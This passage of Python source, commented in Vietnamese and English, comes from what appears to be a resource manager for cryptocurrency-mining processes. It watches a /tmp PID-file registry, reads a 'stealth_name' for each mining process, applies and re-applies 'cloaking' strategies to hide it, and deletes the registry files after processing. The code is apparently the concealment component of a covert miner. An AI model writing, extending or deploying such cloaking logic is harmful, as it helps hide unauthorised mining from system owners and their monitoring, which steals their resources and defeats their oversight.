            # **Clean up dead processes** (dọn dẹp processes đã chết)
            for pid in dead_pids:
                del self._monitored_processes[pid]
            
            # **Log monitoring stats** (ghi log thống kê giám sát)
            self.logger.info(f"📊 [MONITOR] Cycle complete: {len(self._monitored_processes)} active, {len(dead_pids)} removed")
            self.logger.info(f"📊 [STATS] Cloaked: {self._cloaking_stats['processes_cloaked']}, "
                           f"Failed: {self._cloaking_stats['failed_cloakings']}, "
                           f"Cycles: {self._cloaking_stats['monitoring_cycles']}")
            
        except Exception as e:
            self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")
    
    def _reapply_cloaking_if_needed(self, mining_process: MiningProcess):
        """
        **🥇 SOLUTION 1: Re-apply Cloaking If Needed** (áp dụng lại cloaking nếu cần)
        
        Check if cloaking needs to be reapplied cho process.
        """
        try:
            # **Simple re-application logic** (logic áp dụng lại đơn giản)
            # In a more sophisticated system, this would check if cloaking is still effective
            strategies = self._determine_strategies(mining_process)
            
            for strategy_name in strategies:
                if self.shared_resource_manager:
                    success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, mining_process)
                    if success:
                        self.logger.debug(f"🔄 [REAPPLY] Re-applied {strategy_name} to PID {mining_process.pid}")
                    else:
                        self.logger.warning(f"⚠️ [REAPPLY] Failed to re-apply {strategy_name} to PID {mining_process.pid}")
                        
        except Exception as e:
            self.logger.error(f"❌ [REAPPLY] Failed to reapply cloaking for PID {mining_process.pid}: {e}")

    def _start_pid_file_scanner(self):
        """
        **🥇 SOLUTION 1: PID File Scanner Thread** (thread scanner file PID)
        
        Enhanced File-Based Scanner để auto-trigger cloaking khi detect new PID files.
        Monitor /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
        """
        self.logger.info(f"🔍 [SOLUTION-1] PID File Scanner started - monitoring directory: {self._pid_file_directory}")
        
        while not self._stop_flag:
            try:
                current_time = time.time()
                
                # **Check if scanner cycle interval elapsed** (kiểm tra khoảng thời gian chu kỳ scanner)
                if current_time - self._last_scanner_cycle >= self._file_scanner_interval:
                    self._execute_file_scanner_cycle(current_time)
                    self._last_scanner_cycle = current_time
                    self._scanner_stats['scan_cycles'] += 1
                
                # **Sleep to prevent CPU spinning** (ngủ để tránh CPU quay không)
                time.sleep(2.0)  # Check every 2 seconds
                
            except Exception as e:
                self.logger.error(f"❌ [SOLUTION-1] File scanner error: {e}")
                time.sleep(5.0)  # Wait longer on error
        
        self.logger.info("🔚 [SOLUTION-1] PID File Scanner stopped")
    
    def _execute_file_scanner_cycle(self, current_time: float):
        """
        **🥇 SOLUTION 1: Execute File Scanner Cycle** (thực thi chu kỳ scanner file)
        
        Scan /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
        """
        try:
            # **Ensure PID directory exists** (đảm bảo thư mục PID tồn tại)
            if not self._pid_file_directory.exists():
                self.logger.debug(f"📁 [FILE-SCANNER] PID directory not found: {self._pid_file_directory}")
                return
            
            self.logger.debug(f"🔍 [FILE-SCANNER] Scanning directory: {self._pid_file_directory}")
            
            # **Get all PID files** (lấy tất cả file PID)
            pid_files = list(self._pid_file_directory.glob("pid_*.json"))
            
            if not pid_files:
                self.logger.debug("📂 [FILE-SCANNER] No PID files found")
                return
            
            self.logger.info(f"📋 [FILE-SCANNER] Found {len(pid_files)} PID files to process")
            
            processed_count = 0
            for pid_file in pid_files:
                try:
                    success = self._process_pid_file(pid_file)
                    if success:
                        processed_count += 1
                        self._scanner_stats['files_processed'] += 1
                        
                        # **Clean up processed file** (dọn dẹp file đã xử lý)
                        try:
                            pid_file.unlink()
                            self.logger.debug(f"🗑️ [FILE-SCANNER] Cleaned up processed file: {pid_file.name}")
                        except Exception as cleanup_err:
                            self.logger.warning(f"⚠️ [FILE-SCANNER] Failed to cleanup {pid_file.name}: {cleanup_err}")
                    
                except Exception as file_err:
                    self.logger.error(f"❌ [FILE-SCANNER] Error processing file {pid_file.name}: {file_err}")
            
            # **Log cycle results** (ghi log kết quả chu kỳ)
            self.logger.info(f"📊 [FILE-SCANNER] Cycle complete: {processed_count}/{len(pid_files)} files processed")
            self.logger.debug(f"📈 [FILE-SCANNER] Stats: Files={self._scanner_stats['files_processed']}, "
                            f"PIDs={self._scanner_stats['pids_discovered']}, "
                            f"Cloaked={self._scanner_stats['cloaking_triggered']}")
            
        except Exception as e:
            self.logger.error(f"❌ [FILE-SCANNER] Scanner cycle failed: {e}")
    
    def _process_pid_file(self, pid_file: Path) -> bool:
        """
        **🥇 SOLUTION 1: Process Single PID File** (xử lý file PID đơn)
        
        Parse và process một PID file để trigger cloaking.
        """
        try:
            self.logger.debug(f"📄 [FILE-PROCESS] Processing file: {pid_file.name}")
            
            # **Read and parse PID file** (đọc và phân tích file PID)
            import json
            with open(pid_file, 'r') as f:
                file_data = json.load(f)
            
            # **Extract PID and metadata** (trích xuất PID và metadata)
            pid = file_data.get('pid')
            metadata = file_data.get('metadata', {})
            
            if not pid:
                self.logger.warning(f"⚠️ [FILE-PROCESS] No PID found in file: {pid_file.name}")
                return False
            
            self.logger.info(f"🎯 [FILE-PROCESS] Discovered PID {pid} from file {pid_file.name}")
            self._scanner_stats['pids_discovered'] += 1
            
            # **Check if PID already monitored** (kiểm tra PID đã được giám sát chưa)
            if pid in self._monitored_processes:
                self.logger.debug(f"ℹ️ [FILE-PROCESS] PID {pid} already monitored, skipping")
                return True  # Consider it success since it's already handled
            
            # **Verify process still exists** (xác minh process vẫn tồn tại)
            try:
                import psutil
                proc = psutil.Process(pid)
                if not proc.is_running():
                    self.logger.info(f"💀 [FILE-PROCESS] PID {pid} is no longer running, skipping")
                    return True  # Success - no need to cloak a dead process
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                self.logger.info(f"💀 [FILE-PROCESS] PID {pid} not accessible, skipping")
                return True
            
            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
            process_name = metadata.get('stealth_name', f'process_{pid}')
            cmd = metadata.get('cmd', [])
            
            mining_process = MiningProcess(
                pid=pid,
                name=process_name,
                cmd=cmd
            )
            
            # **Trigger cloaking via file scanner** (kích hoạt cloaking qua file scanner)
            self.logger.info(f"🚀 [FILE-PROCESS] Triggering cloaking for discovered PID {pid}")
            self.trigger_cloaking(mining_process, 'file_scanner_discovery')
            
            # **Add to monitored processes** (thêm vào processes được giám sát)
            self._monitored_processes[pid] = mining_process
            self._scanner_stats['cloaking_triggered'] += 1
            
            self.logger.info(f"✅ [FILE-PROCESS] Successfully processed PID {pid} via file scanner")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [FILE-PROCESS] Failed to process file {pid_file.name}: {e}")
            import traceback
            self.logger.debug(f"🔍 [FILE-PROCESS] Traceback: {traceback.format_exc()}")
            return False

    def stop(self):
        """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
        self.shutdown()